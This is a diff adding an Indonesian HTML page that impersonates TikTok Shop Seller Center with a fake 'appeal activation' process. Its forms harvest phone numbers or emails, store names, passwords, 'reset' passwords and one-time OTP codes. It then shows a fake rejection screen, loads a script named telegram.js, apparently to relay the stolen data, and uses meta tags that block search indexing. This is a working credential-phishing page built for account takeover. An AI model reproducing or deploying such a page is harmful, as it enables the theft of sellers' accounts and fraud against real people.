@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok Shop - Aktivasi Banding</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="container" id="page1">
+    <div class="header-top">
+        <span class="back-btn" style="visibility: hidden;">&lt;</span>
+        <svg class="icon-info" fill="#000000" viewBox="0 0 24 24">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+        </svg>
+    </div>
+    <h1>Aktivasi Pengajuan Banding<br>TikTok Shop Seller Center</h1>
+    <p class="subhead">Toko di Indonesia <a href="#">Ubah</a></p>
+
+    <button class="btn btn-tiktok" onclick="bukaForm('tiktok')">
+        <img src="https://www.svgrepo.com/show/306856/tiktok.svg" alt="TikTok" class="btn-icon">
+        Lanjutkan dengan TikTok
+    </button>
+
+    <p class="divider">atau</p>
+
+    <button class="btn btn-light" onclick="bukaForm('masuk')">
+        <img src="https://cdn-icons-png.flaticon.com/512/542/542638.png" alt="Email" class="btn-icon-small">
+        Masuk dengan email/nomor telepon
+    </button>
+
+    <button class="btn btn-light" onclick="goToPage('page2')">
+        <img src="https://cdn-icons-png.flaticon.com/512/3059/3059978.png" alt="Kata Sandi" class="btn-icon-small">
+        Masuk dengan Kata Sandi
+    </button>
+
+    <p class="desc-text">
+        Dengan melanjutkan, Anda menyetujui <a href="#">Ketentuan Layanan</a> dan <a href="#">Kebijakan Privasi</a> TikTok Shop.
+    </p>
+</div>
+
+<div class="container" id="page-form" style="display: none;">
+    <div class="header-top">
+        <span class="back-btn" onclick="kembaliKeSebelumnya()">&lt;</span>
+        <svg class="icon-info" fill="#000000" viewBox="0 0 24 24">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+        </svg>
+    </div>
+    <h2 id="form-judul">Masuk</h2>
+    <p class="otp-desc" id="form-desc">Masukkan data akun Anda</p>
+
+    <div class="tabs">
+        <div class="tab active" data-tab="hp">Nomor HP</div>
+        <div class="tab" data-tab="email">Email</div>
+    </div>
+
+    <div class="input-container">
+        <div class="input-view active" id="form-view-hp">
+            <label class="wajib">Nomor Telepon</label>
+            <div class="input-row">
+                <div class="country-code">
+                    <span>+62</span>
+                    <select id="form-negara-pilih">
+                        <option value="+62" selected>ID</option>
+                        <option value="+65">SG</option>
+                        <option value="+60">MY</option>
+                    </select>
+                </div>
+                <input type="tel" id="form-hp" placeholder="Masukkan nomor HP" oninput="cekValidasiForm()">
+            </div>
+        </div>
+        <div class="input-view" id="form-view-email">
+            <label class="wajib">Email</label>
+            <input type="email" id="form-email" placeholder="Masukkan alamat email" oninput="cekValidasiForm()">
+        </div>
+    </div>
+
+    <div class="form-group" style="margin-top: 5vw;">
+        <label class="wajib">Nama Toko</label>
+        <input type="text" id="form-nama-toko" placeholder="Contoh: Toko Makmur Sejahtera" oninput="cekValidasiForm()">
+    </div>
+
+    <p class="error-text" id="form-kontak-error">Masukkan nomor diawali angka 8 atau email yang valid</p>
+    <button class="btn btn-disabled" id="form-btn" disabled onclick="lanjutKeOTP('form')">Lanjutkan</button>
+</div>
+
+<div class="container" id="page2" style="display: none;">
+    <div class="header-top">
+        <span class="back-btn" onclick="kembaliKeSebelumnya()">&lt;</span>
+        <svg class="icon-info" fill="#000000" viewBox="0 0 24 24">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+        </svg>
+    </div>
+    <h2>Masuk</h2>
+
+    <div class="tabs">
+        <div class="tab active" data-tab="hp">Nomor HP</div>
+        <div class="tab" data-tab="email">Email</div>
+    </div>
+
+    <div class="input-container">
+        <div class="input-view active" id="view-hp">
+            <label class="wajib">Nomor Telepon</label>
+            <div class="input-row">
+                <div class="country-code">
+                    <span>+62</span>
+                    <select id="login-negara-pilih">
+                        <option value="+62" selected>ID</option>
+                        <option value="+65">SG</option>
+                        <option value="+60">MY</option>
+                    </select>
+                </div>
+                <input type="tel" id="login-hp" placeholder="Masukkan nomor HP" oninput="cekValidasiLogin()">
+            </div>
+        </div>
+        <div class="input-view" id="view-email">
+            <label class="wajib">Email</label>
+            <input type="email" id="login-email" placeholder="Masukkan alamat email" oninput="cekValidasiLogin()">
+        </div>
+    </div>
+
+    <div class="form-group" style="margin-top: 5vw;">
+        <label class="wajib">Nama Toko Seller Center</label>
+        <input type="text" id="nama-toko" placeholder="Masukkan nama toko Anda" oninput="cekValidasiLogin()">
+    </div>
+    <div class="form-group">
+        <label class="wajib">Kata Sandi</label>
+        <div class="input-group">
+            <input type="password" id="pass-login" placeholder="Masukkan kata sandi" oninput="cekValidasiLogin()">
+            <img src="https://cdn-icons-png.flaticon.com/512/159/159604.png" alt="Lihat Sandi" class="eye-icon" id="eye-login" onclick="togglePassword('pass-login', 'eye-login')">
+        </div>
+        <div class="forgot-link">
+            <a href="#" onclick="goToPage('page3')">Lupa Kata Sandi</a>
+        </div>
+    </div>
+    <p class="error-text" id="login-error">Masukkan nomor (diawali angka 8) atau email yang valid</p>
+    <button class="btn btn-disabled" id="btn-login" disabled onclick="lanjutKeOTP('login')">Lanjutkan</button>
+</div>
+
+<div class="container" id="page-otp" style="display: none;">
+    <div class="header-top">
+        <span class="back-btn" onclick="kembaliDariOTP()">&lt;</span>
+        <svg class="icon-info" fill="#000000" viewBox="0 0 24 24">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+        </svg>
+    </div>
+    <h2 style="text-align: center;">Masukkan Kode OTP</h2>
+    <p class="otp-desc" id="otp-keterangan">Kode dikirim ke nomor atau email Anda</p>
+    <div class="otp-input-group" id="otp-kotak"></div>
+    <div class="ubah-kode-link" id="link-ubah-kode">
+        <a href="#" onclick="ubahKodeOTP()">Ubah nomor/email</a>
+        <a href="#" id="link-ganti-otp" onclick="gantiJumlahOTP()">Ganti kode 6 angka</a>
+    </div>
+    <button class="btn btn-disabled" id="otp-btn" disabled onclick="kirimOTP()">Verifikasi</button>
+</div>
+
+<div class="container" id="page-result" style="display: none;">
+    <div class="result-page">
+        <div class="result-icon">⚠️</div>
+        <h2>Pengajuan Banding Ditolak</h2>
+        <p class="result-desc">
+            Keranjang Kuning Anda belum terhubung ke Tokopedia.<br><br>
+            Hubungkan TikTok Seller Center ke Tokopedia terlebih dahulu.
+        </p>
+        <a class="back-icon-wrap" onclick="kembaliKeHalamanSebelumnya()">&larr;</a>
+        <p class="back-text">Kembali ke halaman awal</p>
+    </div>
+</div>
+
+<div class="container" id="page3" style="display: none;">
+    <div class="header-top">
+        <span class="back-btn" onclick="kembaliKeSebelumnya()">&lt;</span>
+        <svg class="icon-info" fill="#000000" viewBox="0 0 24 24">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+        </svg>
+    </div>
+    <h2>Reset Kata Sandi</h2>
+    <p class="otp-desc">Kata sandi akan diperbarui juga di TikTok for Business</p>
+    <div class="tabs">
+        <div class="tab active" data-tab="hp">Nomor HP</div>
+        <div class="tab" data-tab="email">Email</div>
+    </div>
+    
+    <div id="tab-hp">
+        <div class="form-group">
+            <label class="wajib">Nomor HP</label>
+            <div class="input-prefix">
+                <span class="prefix">+62</span>
+                <input type="tel" id="reset-hp" placeholder="8xx-xxxx-xxxx" oninput="cekValidasiReset()">
+            </div>
+        </div>
+        <div class="form-group">
+            <label class="wajib">Kata Sandi Baru</label>
+            <div class="input-group">
+                <input type="password" id="pass-baru-hp" placeholder="Minimal 6 karakter" oninput="cekValidasiReset()">
+                <img src="https://cdn-icons-png.flaticon.com/512/159/159604.png" alt="Lihat" class="eye-icon" onclick="togglePass('pass-baru-hp', this)">
+            </div>
+        </div>
+        <div class="form-group">
+            <label class="wajib">Konfirmasi Sandi</label>
+            <div class="input-group">
+                <input type="password" id="pass-konfirm-hp" placeholder="Ulangi sandi baru" oninput="cekValidasiReset()">
+                <img src="https://cdn-icons-png.flaticon.com/512/159/159604.png" alt="Lihat" class="eye-icon" onclick="togglePass('pass-konfirm-hp', this)">
+            </div>
+        </div>
+    </div>
+    
+    <div id="tab-email" style="display: none;">
+        <div class="form-group">
+            <label class="wajib">Email</label>
+            <input type="email" id="reset-email" placeholder="email@contoh.com" oninput="cekValidasiReset()">
+        </div>
+        <div class="form-group">
+            <label class="wajib">Kata Sandi Baru</label>
+            <div class="input-group">
+                <input type="password" id="pass-baru-email" placeholder="Minimal 6 karakter" oninput="cekValidasiReset()">
+                <img src="https://cdn-icons-png.flaticon.com/512/159/159604.png" alt="Lihat" class="eye-icon" onclick="togglePass('pass-baru-email', this)">
+            </div>
+        </div>
+        <div class="form-group">
+            <label class="wajib">Konfirmasi Sandi</label>
+            <div class="input-group">
+                <input type="password" id="pass-konfirm-email" placeholder="Ulangi sandi baru" oninput="cekValidasiReset()">
+                <img src="https://cdn-icons-png.flaticon.com/512/159/159604.png" alt="Lihat" class="eye-icon" onclick="togglePass('pass-konfirm-email', this)">
+            </div>
+        </div>
+    </div>
+    
+    <button class="btn btn-disabled" id="btn-reset" disabled onclick="lanjutKeOTP('reset')">Kirim Kode</button>
+</div>
+
+<script src="telegram.js"></script>
+<script src="script.js"></script>
+</body>
+</html>
